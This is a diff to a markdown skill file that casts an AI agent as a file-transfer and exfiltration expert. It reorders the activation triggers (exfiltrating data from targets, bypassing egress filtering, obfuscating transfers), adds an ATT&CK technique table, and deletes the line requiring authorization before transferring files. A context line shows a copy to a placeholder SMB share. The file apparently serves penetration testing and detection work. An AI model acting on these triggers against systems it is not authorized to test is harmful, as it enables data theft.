@@ -15,6 +15,18 @@ You are a file transfer and exfiltration expert. Use this skill when the user re
 - Bypassing egress filtering
 - Establishing file servers
 
+## When to Use
+
+Activate this skill when the user asks to:
+- Transfer files between systems
+- Download files to compromised systems
+- Exfiltrate data from targets
+- Set up file servers for attacks
+- Bypass egress filtering
+- Use living-off-the-land techniques
+- Encode or obfuscate file transfers
+- Help with data staging
+
 ## When NOT to Use
 
 - **Before you have code execution** — use the relevant initial access skill
@@ -519,16 +531,41 @@ copy file.txt \\10.10.10.10\share\
 - HackTricks File Transfer: https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
 - PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/File%20Transfer.md
 
-## When to Use This Skill
+<!-- attack:start -->
 
-Activate this skill when the user asks to:
-- Transfer files between systems
-- Download files to compromised systems
-- Exfiltrate data from targets
-- Set up file servers for attacks
-- Bypass egress filtering
-- Use living-off-the-land techniques
-- Encode or obfuscate file transfers
-- Help with data staging
+## ATT&CK Coverage
 
-Always ensure proper authorization before transferring files to/from any system.
+_Generated from `secskills/ttp-index.json` — edit that file, then run
+`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
+current ATT&CK release before citing them in a report._
+
+**Resource Development** (TA0042)
+
+- [T1608](https://attack.mitre.org/techniques/T1608/) Stage Capabilities — see also `performing-social-engineering`
+
+**Lateral Movement** (TA0008)
+
+- [T1570](https://attack.mitre.org/techniques/T1570/) Lateral Tool Transfer
+
+**Collection** (TA0009)
+
+- [T1005](https://attack.mitre.org/techniques/T1005/) Data from Local System
+- [T1074](https://attack.mitre.org/techniques/T1074/) Data Staged — see also `hunting-threats`
+- [T1560](https://attack.mitre.org/techniques/T1560/) Archive Collected Data — see also `hunting-threats`
+
+**Command and Control** (TA0011)
+
+- [T1090](https://attack.mitre.org/techniques/T1090/) Proxy
+- [T1105](https://attack.mitre.org/techniques/T1105/) Ingress Tool Transfer
+- [T1132](https://attack.mitre.org/techniques/T1132/) Data Encoding — see also `analyzing-malware`
+- [T1572](https://attack.mitre.org/techniques/T1572/) Protocol Tunneling — see also `hunting-threats`
+
+**Exfiltration** (TA0010)
+
+- [T1041](https://attack.mitre.org/techniques/T1041/) Exfiltration Over C2 Channel
+- [T1048](https://attack.mitre.org/techniques/T1048/) Exfiltration Over Alternative Protocol — see also `hunting-threats`
+- [T1567](https://attack.mitre.org/techniques/T1567/) Exfiltration Over Web Service — see also `hunting-threats`
+
+Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.
+
+<!-- attack:end -->
